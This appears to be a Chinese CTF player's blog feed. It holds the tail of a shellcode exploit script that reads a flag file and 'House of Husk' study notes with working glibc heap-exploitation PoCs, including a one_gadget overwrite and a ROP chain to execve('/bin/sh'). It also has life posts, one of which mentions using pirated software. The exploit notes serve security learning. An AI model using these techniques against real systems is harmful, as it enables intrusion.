+&quot;&quot;&quot;)+\
+&quot;\xcd&quot; # write(fd_pipe[1],&quot;a&quot;,1)
+
+payload += asm(&quot;&quot;&quot;
+inc ecx
+&quot;&quot;&quot;)*0x1c+\
+asm(&quot;&quot;&quot;
+inc eax
+inc eax
+inc eax
+&quot;&quot;&quot;)+\
+'\xcd' # write(fd_pipe[1],&quot;g&quot;,1)
+
+payload += asm(&quot;&quot;&quot;
+dec ecx
+inc eax
+inc eax
+inc eax
+&quot;&quot;&quot;)+\
+'\xcd' # write(fd_pipe[1],&quot;\x00&quot;,1)
+
+payload += asm(&quot;&quot;&quot;
+push esi
+pop ebx
+inc eax
+inc eax
+pop ecx
+inc edx
+inc edx
+inc edx
+inc edx
+&quot;&quot;&quot;)+\
+'\xcd' # read(fd_pipe[0],buf,0x5)
+
+payload += asm(&quot;&quot;&quot;
+push ecx
+pop ebx
+push esi
+push esi
+pop ecx
+pop edx
+&quot;&quot;&quot;)+\
+'\xcd' # open(&quot;flag&quot;,0)
+
+payload += asm(&quot;&quot;&quot;
+push ebx
+push eax
+pop ebx
+dec eax
+pop ecx
+&quot;&quot;&quot;)+\
+asm(&quot;&quot;&quot;
+inc edx
+&quot;&quot;&quot;)*0x30+\
+'\xcd' # read(fd_flag,buf,0x30)
+
+payload += asm(&quot;&quot;&quot;
+push esi
+pop eax
+inc eax
+inc eax
+inc eax
+inc eax
+dec ebx
+dec ebx
+dec ebx
+&quot;&quot;&quot;)+\
+'\xcd'+&quot;\x00&quot; # write(1,buf,0x30)
+
+sh.sendafter('code',payload+&quot;\x00&quot;)
+sh.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;未完&quot;&gt;未完&lt;/h2&gt;
+
+&lt;p&gt;shellcode 还有诸多用法。例如用 &lt;code&gt;mprotect&lt;/code&gt; 改写权限，利用 &lt;code&gt;sigreturn&lt;/code&gt; 构造 SROP 等。做赛题时灵活运用。&lt;/p&gt;</content><author><name></name></author><category term="_posts" /><category term="binary" /><summary type="html">本文章为个人笔记性质。如有错误，请多多指教。 谐音梗。issue──&amp;gt;艺术</summary></entry><entry><title type="html">日遇三险</title><link href="http://localhost:4000/_posts/2021-03-09-%E6%97%A5%E9%81%87%E4%B8%89%E9%99%A9/" rel="alternate" type="text/html" title="日遇三险" /><published>2021-03-09T00:00:00+08:00</published><updated>2021-03-09T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E6%97%A5%E9%81%87%E4%B8%89%E9%99%A9</id><content type="html" xml:base="http://localhost:4000/_posts/2021-03-09-%E6%97%A5%E9%81%87%E4%B8%89%E9%99%A9/">&lt;h1 id=&quot;日遇三险&quot;&gt;日遇三险&lt;/h1&gt;
+
+&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/日遇三险/bigsur.png&quot; alt=&quot;bigsur&quot; /&gt;&lt;/p&gt;
+
+&lt;aside class=&quot;admonition info&quot;&gt;
+
+  &lt;p&gt;这个图片所示的信息自从去年那次 m1 芯片发行以来就一直在我的电脑出现着。然而考虑到新系统的出现必然会引起软硬件的适配问题。所以我一直没有选择升级 macOS Big Sur。&lt;/p&gt;
+
+&lt;/aside&gt;
+
+&lt;h2 id=&quot;起&quot;&gt;起&lt;/h2&gt;
+
+&lt;p&gt;事情因何而起？某天，少年夜行，月明天晴，了无星辰。过贵实验室，停而闲游。见学长维护服务器，学之。大惊其新系统。叙之，知诸事皆宜。软硬件皆无不适之相。乃隐隐生更新之意。&lt;/p&gt;
+
+&lt;h2 id=&quot;承&quot;&gt;承&lt;/h2&gt;
+
+&lt;p&gt;于是我选择升级 Bug Sur 体验一下很 tm 舒服的 UI。当然，升级之前的第一件事就是 &lt;strong&gt;时间机器备份&lt;/strong&gt;。移动硬盘除了放 &lt;em&gt;学习资料&lt;/em&gt; 之外，还进行了虚拟机和 mac 本体的备份。此时已经进行了 800多G 的冗余备份。所以就先清理一下。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;清空废纸篓&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;但是万万没想到啊，对于移动硬盘的抹除速度竟然如此之慢。800G 的东西起码要删了两三个小时。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;时间机器&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;时间机器的备份也是要慢到了一种极限。只是准备就要半个多小时。进行时间机器备份的时候 mac 会对它进行限流，以防止占用较多的资源。于是我们可以解除封印。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo sysctl debug.lowpri_throttle_enabled=0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;解除封印之后只是将备份速度从 Kb 量级拉到了 Mb 量级。想要进行接近 200G 的备份，对于这种 dio 移动硬盘来说还是太勉强了一点。&lt;/p&gt;
+
+&lt;p&gt;备份完毕之后就直接开始升级。下载 Big Sur，安装。储存空间不够，把虚拟机放到移动硬盘里。安装，成功。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/日遇三险/success.jpg&quot; alt=&quot;success&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;转&quot;&gt;转&lt;/h2&gt;
+
+&lt;p&gt;pwner 在驯化 Big Sur 时，所做的第一件事就是 &lt;strong&gt;打开虚拟机&lt;/strong&gt;。parallels desktop 15 是不支持 Bug Sur 的。但是我们可以找一个随处可见的 parallels desktop 16 来进行替代。&lt;/p&gt;
+
+&lt;h3 id=&quot;崩溃&quot;&gt;崩溃&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;成年人的崩溃往往就在一瞬间&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;对，此时第一险来了。parallels desktop 16 毫无例外的翻车了。&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;导入以前的 ubuntu 18.04 之后，tty直接启动不起来。只会冒出一大片黄色的警告⚠️。重启，发现系统进不去。尝试输入 ls 等命令，发现进入的是一种 类似 base system 的界面。&lt;/li&gt;
+  &lt;li&gt;parallels desktop 启动时，明文列出来：不能联网。那我还用个羁绊？&lt;/li&gt;
+  &lt;li&gt;尝试用可联网的启动器进行启动，无果。再次启动，发现没有权限打开。搜索，https://zhuanlan.zhihu.com/p/331816664，安文章方法进行脱壳，无果。无虚拟机只能当场退役，遂放弃。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;此时一般有两种选择。一种是继续在 Big Sur 混下去。需要我把虚拟机弄好，并且配置一个稳定的虚拟机环境。但是从一个初始 ubuntu 开始配置的话需要极大的时间成本。另一种是回退版本。为了近期的比赛学习，我选择了第二种。&lt;/p&gt;
+
+&lt;p&gt;按照网上的说明，跨系统版本进行回退，需要抹除磁盘。恢复模式进入方式重启时按住 &lt;code&gt;command+R&lt;/code&gt; ，进去之后选磁盘工具 抹除磁盘。&lt;/p&gt;
+
+&lt;p&gt;此时第二险来了。我抹除磁盘之后重启，企图用时间机器恢复系统。结果直接给👴干崩了。屏幕上出现了一个地球图形。官网是这么说的。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果您无法从 macOS 恢复功能启动&lt;/p&gt;
+
+  &lt;p&gt;如果您的 Mac 无法从内建的 macOS 恢复系统启动，它可能会尝试通过互联网从 macOS 恢复功能启动。出现这种情况时，您在启动期间将会看到旋转的地球，而不是 Apple 标志&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;也就是说，抹除之后重启是不对的。👴就是龙鸣。此时只能进行互联网修复。&lt;/p&gt;
+
+&lt;p&gt;然而互联网修复的好像并不是 mac 系统，而是 mac base。所以说此时我还是需要进行时间机器恢复，但至少我可以看到我能用时间机器恢复了。于是直接选时间机器，进行了长达好几个小时的恢复。&lt;/p&gt;
+
+&lt;p&gt;恢复完毕之后屏幕上直接出现一个禁止符号🚫。搜索，得出结论。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果您的 Mac 在启动时出现一个由直线穿过的圆圈&lt;/p&gt;
+
+  &lt;p&gt;如果出现一个由直线穿过的圆圈，则表示您的启动磁盘包含 Mac 操作系统，但它不是您的 Mac 可以使用的 macOS。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;也就是说👴之前是在 Big Sur 进行的互联网恢复，给👴恢复到了 Big Sur 的 base。我还得重新安装一个 catalina 才能进行时间机器恢复。行吧，我安，我安装不行嘛。于是开始了 catalina 的安装。&lt;/p&gt;
+
+&lt;p&gt;第三险悄无声息地来了。Catalina 终于安装好了。我寻思这直接进行迁移助理恢复文件吧。恢复，卡住。恢复，一半，卡住。恢复，均在搜索文件那一步卡住不动。&lt;/p&gt;
+
+&lt;p&gt;也就是说我必须要对着这个空无一物的 catalina。到这种情况唯一的出路就是再进行一次时间机器回退。但是我此时还不知道时间机器恢复是否会像上次一样出现🚫。于是我做出决定：再恢复一次，不行直接买新电脑。&lt;/p&gt;
+
+&lt;h2 id=&quot;合&quot;&gt;合&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;剩余时间13小时……&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;经历了好几个小时（大约两小时）的恢复，我成功回到了前天下午 5:01 的状态。期间经历了自我的崩溃，作业的重写，夜彳亍。&lt;/p&gt;
+
+&lt;p&gt;总之瞎搞是要付出代价的。我们作为盗版的受益者就应该做一些有把握的事情。千万不要因为一时的新鲜而破坏了自己的生产环境。&lt;/p&gt;
+
+&lt;p&gt;少年夜行，见新系统，思之。往而试之，磁盘崩。恢复不果，遂重装。然恢复缓。时间机器回退之。果。后遂无升级意。&lt;/p&gt;
+
+&lt;h2 id=&quot;最新动态&quot;&gt;最新动态&lt;/h2&gt;
+
+&lt;p&gt;由于在 catalina 中出现了过几个小时自动 fork 炸系统的问题，2021.07.09 我还是升级到了 big sur。并选择妥协使用了 VMware fusion 进行虚拟机配置。&lt;/p&gt;</content><author><name></name></author><category term="_posts" /><category term="life" /><summary type="html">日遇三险</summary></entry><entry><title type="html">House of husk学习</title><link href="http://localhost:4000/_posts/2020-12-13-House_of_husk%E5%AD%A6%E4%B9%A0/" rel="alternate" type="text/html" title="House of husk学习" /><published>2020-12-13T00:00:00+08:00</published><updated>2020-12-13T00:00:00+08:00</updated><id>http://localhost:4000/_posts/House_of_husk%E5%AD%A6%E4%B9%A0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-12-13-House_of_husk%E5%AD%A6%E4%B9%A0/">&lt;h1 id=&quot;house-of-husk&quot;&gt;House of husk&lt;/h1&gt;
+
+&lt;h2 id=&quot;开箱即用&quot;&gt;开箱即用&lt;/h2&gt;
+
+&lt;h3 id=&quot;husks-method&quot;&gt;Husk’s method&lt;/h3&gt;
+
+&lt;p&gt;条件：有 &lt;code&gt;printf&lt;/code&gt; 系函数，并有格式化符。有可以制造 UAF 的条件。malloc 分配的大小没限制或几乎没限制。没开沙箱 &lt;del&gt;或者开了NX&lt;/del&gt;&lt;/p&gt;
+
+&lt;p&gt;使用：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;leak libc&lt;/li&gt;
+  &lt;li&gt;unsorted bin attack overwrite &lt;code&gt;global_max_fast&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;overwrite &lt;code&gt;__printf_arginfo_table&lt;/code&gt; and &lt;code&gt;__printf_arginfo_table&lt;/code&gt;, write &lt;code&gt;one_gadget&lt;/code&gt; into  &lt;code&gt;__printf_arginfo_table[?]&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;call &lt;code&gt;printf&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;loonas-method&quot;&gt;Loona’s method&lt;/h3&gt;
+
+&lt;p&gt;条件：可以在栈上伪造 size 。有可以制造 UAF 的条件。malloc 分配的大小没限制或几乎没限制。&lt;/p&gt;
+
+&lt;p&gt;使用：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;leak libc&lt;/li&gt;
+  &lt;li&gt;unsorted bin attack overwrite &lt;code&gt;global_max_fast&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code&gt;free&lt;/code&gt; overwrite &lt;code&gt;environ&lt;/code&gt;，show &lt;code&gt;fd&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;correct &lt;code&gt;fd&lt;/code&gt; to &lt;code&gt;fake_size&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;double malloc, rop&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;分割线&quot;&gt;=======================分割线=======================&lt;/h2&gt;
+
+&lt;h2 id=&quot;husks-method-1&quot;&gt;Husk’s method&lt;/h2&gt;
+
+&lt;h3 id=&quot;知识列表&quot;&gt;知识列表&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;leak libc&lt;/li&gt;
+  &lt;li&gt;unsorted bin attack&lt;/li&gt;
+  &lt;li&gt;overwrite &lt;code&gt;global_max_fast&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;the call chain of &lt;code&gt;printf&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;overwrite &lt;code&gt;__printf_arginfo_table&lt;/code&gt; and &lt;code&gt;__printf_arginfo_table&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;原理&quot;&gt;原理&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;3.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;global_max_fast&lt;/code&gt; 的默认值是 0x80，&lt;code&gt;fastbin&lt;/code&gt; 中的 &lt;code&gt;chunk&lt;/code&gt; 会被写入到 &lt;code&gt;main_arena&lt;/code&gt; 的某个位置。但是如果 &lt;code&gt;global_max_fast&lt;/code&gt; 很大，那么我们就可以通过 free 一个大 size 的 &lt;code&gt;chunk&lt;/code&gt; ， 这样就可以对一个 &lt;code&gt;main_arena&lt;/code&gt; 的高地址写入一个堆地址。&lt;/p&gt;
+
+&lt;p&gt;具体计算如下：&lt;/p&gt;
+
+\[malloc\_size = (addr\_to\_write-main\_arena\_addr)*2-16\]
+
+&lt;p&gt;写成函数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def offset2size(addr):
+  return (addr-MAIN_ARENA)*2-0x10
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;4.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;	if (__printf_function_table == NULL)
+    {
+      __printf_arginfo_table = (printf_arginfo_size_function **)
+        calloc (UCHAR_MAX + 1, sizeof (void *) * 2);
+      if (__printf_arginfo_table == NULL)
+        {
+          result = -1;
+          goto out;
+        }
+      __printf_function_table = (printf_function **)
+        (__printf_arginfo_table + UCHAR_MAX + 1);
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;上面是 &lt;a href=&quot;https://code.woboq.org/userspace/glibc/stdio-common/reg-printf.c.html#__register_printf_specifier&quot;&gt;__register_printf_specifier&lt;/a&gt; 函数的部分代码，当 &lt;code&gt;register_printf_specifier&lt;/code&gt; 函数第一次调用时，会给 &lt;code&gt;__printf_arginfo_table &lt;/code&gt;注册格式化输出函数，或者说赋初值。这个函数最终会在 &lt;code&gt;__parse_one_specmb&lt;/code&gt; 中被调用。&lt;/p&gt;
+
+&lt;p&gt;同理， &lt;code&gt;__printf_function_table&lt;/code&gt; 函数如果被注册，也会最终在 &lt;code&gt;printf_positional&lt;/code&gt; 被调用。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;5.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;如果一个 &lt;code&gt;printf&lt;/code&gt; 函数是这么输出的：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;printf(&quot;%s&quot;,str);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;那么我们需要在伪造的堆块上这么构造：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;chunk + ('X' - 2) * 8 = exploit_function&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;只要这个 &lt;code&gt;printf&lt;/code&gt; 被调用，就会触发 &lt;code&gt;exploit_function&lt;/code&gt; 。&lt;/p&gt;
+
+&lt;h3 id=&quot;poc&quot;&gt;POC&lt;/h3&gt;
+
+&lt;p&gt;根据POC来分析一下 &lt;code&gt;house_of_husk&lt;/code&gt; 的利用过程。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/**
+ * Husk's method - House of Husk
+ * This PoC is supposed to be run with libc-2.27
+ */
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+#define offset2size(ofs) ((ofs) * 2 - 0x10)
+#define MAIN_ARENA       0x3ebc40
+#define MAIN_ARENA_DELTA 0x60
+#define GLOBAL_MAX_FAST  0x3ed940
+#define PRINTF_FUNCTABLE 0x3f0658
+#define PRINTF_ARGINFO   0x3ec870
+#define ONE_GADGET       0x10a45c
+
+int main (void)
+{
+  unsigned long libc_base;
+  char *a[10];
+  setbuf(stdin, NULL);
+  setbuf(stdout, NULL); // make printf quiet
+
+  /* leak libc */
+  a[0] = malloc(0x500); /* UAF chunk */
+  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
+  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
+  a[3] = malloc(0x500); /* avoid consolidation */
+  free(a[0]);
+  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
+  printf(&quot;libc @ 0x%lx\n&quot;, libc_base);
+
+  /* prepare fake printf arginfo table */
+  *(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
+
+  /* unsorted bin attack */
+  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
+  a[0] = malloc(0x500); /* overwrite global_max_fast */
+
+  /* overwrite __printf_arginfo_table */
+  free(a[1]);
+  free(a[2]);
+
+  /* ignite! */
+  getchar();
+  printf(&quot;%X&quot;, 0);
+  
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;第一部分是 &lt;code&gt;unsorted bin attack&lt;/code&gt; 打到&lt;code&gt;global_max_fast&lt;/code&gt;，单独截出来 没什么好说的。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;a[0] = malloc(0x500);
+free(a[0]);
+*(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
+a[0] = malloc(0x500); /* overwrite global_max_fast */
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;下面这部分是改掉&lt;code&gt;global_max_fast&lt;/code&gt;之后用于覆盖&lt;code&gt;__printf_arginfo_table&lt;/code&gt;和&lt;code&gt;__printf_function_table&lt;/code&gt;的。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
+a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
+free(a[1]);
+free(a[2]);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后将伪造的堆块”X”位置改为对应的 exploit 即可。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
+getchar();
+printf(&quot;%X&quot;, 0);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;效果：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;┌─[surager@ubuntu] - [~/machome/ctftools/poc] - [Fri Dec 11, 22:56]
+└─[$] &amp;lt;&amp;gt; ./house_of_husk
+libc @ 0x7f21445d9000
+
+$ whoami
+surager
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;问题&quot;&gt;问题&lt;/h3&gt;
+
+&lt;p&gt;1.开了沙箱之后明显不知道如何控制程序流进行 orw。&lt;/p&gt;
+
+&lt;p&gt;这个可能可以通过 &lt;a href=&quot;https://link.springer.com/article/10.1007/s11416-017-0299-1&quot;&gt;pcop&lt;/a&gt; 技术进行解决，但是还是没有找到能够控制参数的 gadget。也可以通过下一种方法解决。&lt;/p&gt;
+
+&lt;p&gt;2.需要 UAF 的堆块，而一般的题目不会给出直接的 UAF。&lt;/p&gt;
+
+&lt;p&gt;针对 off-by-null 等能够造成堆块重叠的漏洞可以使用 house of husk。&lt;/p&gt;
+
+&lt;p&gt;3.size 没算准。&lt;/p&gt;
+
+&lt;p&gt;建议枪毙。&lt;/p&gt;
+
+&lt;h2 id=&quot;loonas-method-1&quot;&gt;Loona’s method&lt;/h2&gt;
+
+&lt;p&gt;这种方法能够在没有 &lt;code&gt;printf&lt;/code&gt; 和开了沙箱的情况下进行 ROP 攻击。代价是要能在栈上伪造size。&lt;/p&gt;
+
+&lt;h3 id=&quot;poc-1&quot;&gt;POC&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/**
+ * Loona's method - House of Husk
+ * This PoC is supposed to be run with libc-2.27.
+ */
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#define offset2size(ofs) ((ofs) * 2 - 0x10)
+#define MAIN_ARENA       0x3ebc40
+#define MAIN_ARENA_DELTA 0x60
+#define GLOBAL_MAX_FAST  0x3ed940
+#define ENVIRON          0x3ee098
+#define LIBC_BINSH       0x00000000001b40fa
+#define LIBC_POP_RDI     0x2155f
+#define LIBC_POP_RSI     0x0000000000023e8a
+#define LIBC_POP_RDX     0x1b96
+#define LIBC_EXECVE      0xe4e90
+unsigned long libc_base, addr_env, ofs_fake;
+char *a[10];
+int i;
+int main (int argc, char **argv, char **envp)
+{
+  unsigned long fake_size;
+  setbuf(stdin, NULL);
+  setbuf(stdout, NULL); // make printf quiet
+  ofs_fake = (void*)envp - (void*)&amp;amp;fake_size; /* this is fixed */
+  /* leak libc */
+  a[0] = malloc(0x500); /* UAF chunk */
+  a[1] = malloc(offset2size(ENVIRON - MAIN_ARENA));
+  a[2] = malloc(0x500); /* avoid consolidation */
+  free(a[0]);
+  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
+  printf(&quot;libc @ 0x%lx\n&quot;, libc_base);
+  /* unsorted bin attack */
+  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
+  a[0] = malloc(0x500); /* overwrite global_max_fast */
+  /* leak environ */
+  free(a[1]);
+  addr_env = *(unsigned long*)a[1];
+  printf(&quot;environ = 0x%lx\n&quot;, addr_env);
+  *(unsigned long*)a[1] = addr_env - ofs_fake - 8;
+  /* prepare fake size on stack*/
+  fake_size = (offset2size(ENVIRON - MAIN_ARENA) + 0x10) | 1;
+  a[1] = malloc(offset2size(ENVIRON - MAIN_ARENA));
+  /* overwrite return address */
+  a[3] = malloc(offset2size(ENVIRON - MAIN_ARENA));
+  for(i = 0; i &amp;lt; 0x20; i++) {
+    *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDI + 1; /* ret sled */
+  }
+  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDX; i++;
+  *(unsigned long*)(a[3] + i*8) = 0; i++;
+  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RSI; i++;
+  *(unsigned long*)(a[3] + i*8) = 0; i++;
+  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDI; i++;
+  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_BINSH; i++;
+  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_EXECVE; i++;
+  getchar();
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;和 Husk’s method 差不多，先对 &lt;code&gt;global_max_fast&lt;/code&gt; 攻击。然后覆盖到 &lt;code&gt;environ&lt;/code&gt; 。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;{
+  free(a[0]);
+  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
+  printf(&quot;libc @ 0x%lx\n&quot;, libc_base);
+  /* unsorted bin attack */
+  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
+  a[0] = malloc(0x500); /* overwrite global_max_fast */
+  /* leak environ */
+  free(a[1]);
+  addr_env = *(unsigned long*)a[1];
+  printf(&quot;environ = 0x%lx\n&quot;, addr_env);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;之后覆盖这个堆块的 fd 为 &lt;code&gt;fake_size - 8&lt;/code&gt; ，这样进行两次 malloc 之后，我们便将堆块分配到了栈上，拿到了一个栈上的堆块。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;pwndbg&amp;gt; p a[3]
+$1 = 0x7fffffffe330 &quot;\300\t@&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;问题-1&quot;&gt;问题&lt;/h2&gt;
+
+&lt;p&gt;所有 POC 均在 libc2.27 的环境下进行，所以 unsorted bin attack 还好使。&lt;/p&gt;
+
+&lt;p&gt;如果进入 libc2.31 环境中，本方法还需要优化。&lt;/p&gt;
+
+&lt;h2 id=&quot;参考链接&quot;&gt;参考链接&lt;/h2&gt;
+
+&lt;p&gt;House of Husk &lt;a href=&quot;https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507&quot;&gt;https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;house-of-husk学习笔记 &lt;a href=&quot;https://www.anquanke.com/post/id/202387&quot;&gt;https://www.anquanke.com/post/id/202387&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="_posts" /><category term="binary" /><summary type="html">House of husk</summary></entry><entry><title type="html">醉饮九回潇洒去，万军从中取首级</title><link href="http://localhost:4000/_posts/2020-11-11-%E9%86%89%E9%A5%AE%E4%B9%9D%E5%9B%9E%E6%BD%87%E6%B4%92%E5%8E%BB-%E4%B8%87%E5%86%9B%E4%BB%8E%E4%B8%AD%E5%8F%96%E9%A6%96%E7%BA%A7/" rel="alternate" type="text/html" title="醉饮九回潇洒去，万军从中取首级" /><published>2020-11-11T00:00:00+08:00</published><updated>2020-11-11T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E9%86%89%E9%A5%AE%E4%B9%9D%E5%9B%9E%E6%BD%87%E6%B4%92%E5%8E%BB,%E4%B8%87%E5%86%9B%E4%BB%8E%E4%B8%AD%E5%8F%96%E9%A6%96%E7%BA%A7</id><content type="html" xml:base="http://localhost:4000/_posts/2020-11-11-%E9%86%89%E9%A5%AE%E4%B9%9D%E5%9B%9E%E6%BD%87%E6%B4%92%E5%8E%BB-%E4%B8%87%E5%86%9B%E4%BB%8E%E4%B8%AD%E5%8F%96%E9%A6%96%E7%BA%A7/">&lt;h1 id=&quot;醉饮九回潇洒去万军从中取首级2020省赛之旅&quot;&gt;醉饮九回潇洒去，万军从中取首级——2020省赛之旅&lt;/h1&gt;
+
+&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;在经历过初赛龙鸣题目的折磨之后👴们轻松进入省赛决赛。今年山大不知道请到了哪里的神仙，能够承办省赛。于是我们乘着门口的地铁直奔山大而去。&lt;/p&gt;
+
+&lt;h2 id=&quot;实验室集体出游的第一天&quot;&gt;实验室集体出游的第一天&lt;/h2&gt;
+
+&lt;p&gt;👴们还没出发之前他们搁实验室打太湖杯。没办法，只好等一会儿。等到比赛完了，他们要写wp。写完wp，👴们就不用去了。所以我和coin哥哥坚定地选择先走。&lt;/p&gt;
+
+&lt;p&gt;到达山大现场。比赛是在体育场举办的，看着还不算很差。签到完他们让测试网络。👴寻思着只给了一根网线你测你🐴呢。后来问了问腾讯新闻，得到了如下回答。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/省赛/腾汛新闻1.png&quot; alt=&quot;腾汛新闻&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;后来转接头插错了孔，以为不能上网虚惊一场。&lt;/p&gt;
+
+&lt;h3 id=&quot;夜里&quot;&gt;夜里&lt;/h3&gt;
+
+&lt;p&gt;👴跟RWind一个房间，AiDai👴👴跟Rui一个房间，Coin哥哥跟_restart一个房间。&lt;/p&gt;
+
+&lt;p&gt;下面重点来了。由于_restart没来，他立了一个带功。这次同行的有两个女生。孙哥跟其中一个是cp。按道理如果房间是满的，是不能够在满足男女不同房间的情况下进行交换的。但是_restart这一操作直接空出来一个位置。这便给了他们极大的操作空间。然后……就。。。省略一万字。&lt;/p&gt;
+
+&lt;p&gt;刚到宾馆那会儿👴们寻思着整🔥。一边的房间普遍偏小，另一边普遍偏大。于是我们都去了aidai👴👴的带房间里面准备整🔥。&lt;/p&gt;
+
+&lt;h4 id=&quot;放映机&quot;&gt;放映机&lt;/h4&gt;
+
+&lt;p&gt;他们搁那儿研究怎么连接hdmi接头，这是这么多人进行佳片有约的必要条件。&lt;/p&gt;
+
+&lt;p&gt;放映机调电视频道，不管用。&lt;/p&gt;
+
+&lt;p&gt;试图从放映机上找视频切换，不管用。&lt;/p&gt;
+
